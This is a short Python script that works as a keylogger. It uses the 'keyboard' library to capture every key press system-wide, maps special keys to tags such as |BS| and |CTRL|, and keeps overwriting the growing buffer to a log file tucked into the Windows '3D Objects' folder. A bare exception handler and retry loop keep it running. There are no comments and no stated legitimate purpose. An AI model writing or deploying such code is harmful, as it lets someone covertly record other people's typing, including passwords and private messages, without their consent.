import time
import keyboard
start_time = time.time()
buff = ''
while True:
    try:
        while True:
            event = keyboard.read_event()    
            if event.event_type == keyboard.KEY_DOWN:
                key = event.name
                key1 = key
                match key:
                    case "space":
                        key1 = " "
                    case "backspace":
                        key1 = "|BS|"
                    case "right ctrl":
                        key1 = "|CTRL|"
                    case "right alt":
                        key1 = "|ALT|"
                    case "shift":
                        key1 = ""
                    case "right shift":
                        key1 = ""
                    case "caps lock":
                        key1 = "|CP|"
                    case _:
                        if len(key)>1:
                            key1 = f'|{key.upper()}|'
                buff += key1
                elapsed_time = time.time() - start_time
                if elapsed_time >= 0.0:
                    start_time = time.time()
                    with open('C:\\Users\\DELL\\3D Objects\\logs.txt', 'w') as f:
                        f.write(buff)
    except:
        print("error")
    time.sleep(1)


